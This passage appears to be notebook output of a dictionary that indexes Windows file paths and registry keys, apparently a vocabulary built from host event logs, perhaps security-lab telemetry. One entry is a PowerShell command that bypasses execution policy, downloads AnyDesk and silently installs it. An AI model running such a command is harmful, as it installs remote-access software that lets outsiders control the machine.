       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 758,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Getstarted_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 759,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 760,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\tr\\\\*': 761,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\en_US\\\\*': 762,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\af\\\\.git': 763,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\gl-ES\\\\.git': 764,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\bg': 765,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\def\\\\Code Cache\\\\js\\\\.git': 766,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group3\\\\*': 767,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\2637\\\\*': 768,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\lv\\\\.git': 769,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 770,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ja': 771,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AccountsControl_cw5n1h2txyewy\\\\AC\\\\Temp': 772,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{1e87508d-89c2-42f0-8a7e-645a0f50ca58}\\\\PreCreate': 773,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\security_state\\\\.git': 774,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\AppData': 775,\n",
       " 'C:\\\\Users\\\\garypetty\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\misc': 776,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 777,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\Temp': 778,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\zh_TW\\\\.git': 779,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hi\\\\*': 780,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\*': 781,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-YE\\\\.git': 782,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\BackgroundTransferApi\\\\.git': 783,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\db\\\\.git': 784,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_metadata': 785,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 786,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\TempState\\\\*': 787,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-MA\\\\*': 788,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\ca': 789,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs': 790,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\tmp\\\\.git': 791,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache': 792,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{E25B5812-BE88-4BD9-94B0-29233477B6C3}': 793,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.1.7_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 794,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-BZ\\\\.git': 795,\n",
       " 'C:\\\\Windows\\\\Temp\\\\MSASN1.dll': 796,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft Help\\\\.git': 797,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sv\\\\*': 798,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\280811\\\\*': 799,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AppData': 800,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\fi\\\\.git': 801,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\sv\\\\.git': 802,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\pl\\\\.git': 803,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{054FAE61-4DD8-4787-80B6-090220C4B700}\\\\Icon': 804,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\.git': 805,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\*': 806,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\RoamingState\\\\*': 807,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\Settings\\\\.git': 808,\n",
       " 'HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{559D40A3-A036-40FA-AF61-84CB430A4D34}\\\\Icon': 809,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsAlarms_8wekyb3d8bbwe\\\\AC\\\\Temp': 810,\n",
       " 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\Tablet PC\\\\': 811,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxIdentityProvider_8wekyb3d8bbwe\\\\AppData\\\\*': 812,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Service Worker\\\\CacheStorage\\\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\\\0fffa981-3a0e-41e3-9174-f37a60f68993\\\\index-dir\\\\.git': 813,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\TempState': 814,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Safety\\\\edge\\\\local\\\\*': 815,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\LocalState\\\\*': 816,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-SG\\\\.git': 817,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC': 818,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 819,\n",
       " 'C:\\\\Users\\\\dkelly\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\*': 820,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCookies\\\\DNTException': 821,\n",
       " 'C:\\\\Users\\\\james97\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10\\\\demos': 822,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 823,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationHints': 824,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\*': 825,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637680406057830000\\\\2\\\\*': 826,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\Temp': 827,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-VE\\\\.git': 828,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\gu': 829,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\is\\\\.git': 830,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ClientSidePhishing\\\\*': 831,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00.UWPDesktop_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 832,\n",
       " 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\DisableFCM': 833,\n",
       " 'C:\\\\Users\\\\james97\\\\Documents\\\\*': 834,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\BudgetDatabase\\\\*': 835,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\LocalCache\\\\.git': 836,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Nurturing\\\\*': 837,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\el\\\\*': 838,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\*': 839,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\.git': 840,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 841,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\AC\\\\.git': 842,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\it\\\\.git': 843,\n",
       " 'C:\\\\Users\\\\bmoore\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD-ADFS\\\\*': 844,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\en_GB\\\\*': 845,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalState\\\\LocalFiles\\\\637849849811270000\\\\1\\\\*': 846,\n",
       " 'C:\\\\Users\\\\james97\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Linux': 847,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\hy\\\\*': 848,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\pt-BR': 849,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\DeviceSearchCache': 850,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\fr': 851,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Network\\\\.git': 852,\n",
       " 'C:\\\\Users\\\\nataliekent\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\LocalState': 853,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\RoamingState\\\\*': 854,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\.git': 855,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 856,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\LocalLow\\\\Microsoft\\\\Internet Explorer\\\\EmieSiteList\\\\.git': 857,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\*': 858,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\MobilityExperience\\\\ImageCache': 859,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\LocalCache\\\\.git': 860,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Extension State': 861,\n",
       " 'C:\\\\Users\\\\wthornton\\\\Saved Games\\\\.git': 862,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\Desktop\\\\Blacksmith-master\\\\*': 863,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ur': 864,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\AppData\\\\*': 865,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.549981C3F5F10_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 866,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\r7js9xmv.default\\\\.git': 867,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\*': 868,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 869,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-CA\\\\*': 870,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\WidevineCdm\\\\4.10.2391.6': 871,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sr': 872,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 873,\n",
       " '20190706_125803.xls': 874,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\de\\\\.git': 875,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Windows.PrintDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 876,\n",
       " 'powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest -OutFile C:\\\\Users\\\\icampbell\\\\Desktop\\\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = \\\\\"C:\\\\Users\\\\\\\\\\\\\" + icampbell + \\\\\"\\\\Desktop\\\\AnyDesk.exe\\\\\"; Start-Process $file1 /S;\"': 877,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\sr-Latn-RS\\\\*': 878,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Cyrl-BA\\\\.git': 879,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\XboxLive\\\\*': 880,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 881,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy': 882,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-SN\\\\*': 883,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetHistory': 884,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.DesktopAppInstaller_1.17.10271.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities\\\\FileAssociations\\\\.txt': 885,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\*': 886,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-IN': 887,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\.git': 888,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\RoamingState': 889,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\AutomaticDestinations\\\\*': 890,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC': 891,\n",
       " 'C:\\\\Users\\\\nsilva\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\dsc': 892,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\.git': 893,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC': 894,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\CloudStore\\\\*': 895,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\es\\\\*': 896,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\windows_ie_ac_001\\\\*': 897,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp': 898,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 899,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AppData': 900,\n",
       " 'C:\\\\Users\\\\wyatt69\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\TempState\\\\*': 901,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 902,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Roaming\\\\Microsoft\\\\Network\\\\Connections\\\\Pbk\\\\_hiddenPbk': 903,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 904,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 905,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Roaming': 906,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\.git': 907,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\TempState\\\\*': 908,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\IRMProtectors\\\\.git': 909,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\Favicons\\\\.git': 910,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\sr\\\\*': 911,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser\\\\newtab\\\\.git': 912,\n",
